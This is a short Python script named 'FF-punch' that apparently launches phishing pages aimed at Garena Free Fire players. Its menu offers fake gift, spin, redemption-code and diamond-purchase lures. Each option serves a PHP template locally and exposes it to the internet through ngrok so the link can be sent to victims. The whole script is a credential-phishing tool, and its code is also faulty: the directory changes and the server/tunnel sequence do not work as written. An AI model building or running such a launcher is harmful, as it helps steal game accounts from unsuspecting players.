import os 
from pathlib import Path
text = 'FF-punch'
os.system("cfonts "+text+" -f block -c bright_red ")
print('01 - Choose gift + Package gift + Lucky spin.')
print('02 - Garena gift centre.')
print('03 - Magic event reward.')
print('04 - Redemption Code.')
print('05 - Diamond Buy.')
print('06 - Exit.')
input = input('Enter your option:')
if input == '1':
  os.system("cd templates")
  os.system("cd 1")
  os.system("php -S localhost:5678 > /dev/null 2>&1")
  os.system("cd ..")
  print("Copy link in forwarding.")
  print("press ctrl+c to exit.")
  os.system("./ngrok http 5678 > /dev/null 2>&1")
elif input == '2':
  os.system("cd templates")
  os.system("cd 2")
  os.system("php -S localhost:5678 > /dev/null 2>&1")
  os.system("cd ..")
  os.system("./ngrok http 5678 > /dev/null 2>&1") 
elif input == '3':
  os.system("cd templates")
  os.system("cd 3")
  os.system("php -S localhost:5678 > /dev/null 2>&1")
  os.system("cd ..")
  print("Copy link in forwarding.")
  print("press ctrl+c to exit.")
  os.system("./ngrok http 5678 > /dev/null 2>&1")
elif input == '4':
  os.system("cd templates")
  os.system("cd 4")
  os.system("php -S localhost:5678 > /dev/null 2>&1")
  os.system("cd ..")
  print("Copy link in forwarding.")
  print("press ctrl+c to exit.")
  os.system("./ngrok http 5678 > /dev/null 2>&1")
elif input == '5':
  os.system("cd templates")
  os.system("cd 5")
  os.system("php -S localhost:5678 > /dev/null 2>&1")
  os.system("cd ..")
  print("Copy link in forwarding.")
  print("press ctrl+c to exit.")
  os.system("./ngrok http 5678 > /dev/null 2>&1")
elif input == '6':
  os.system("exit")
else :
  print("retry and enter correct option.")
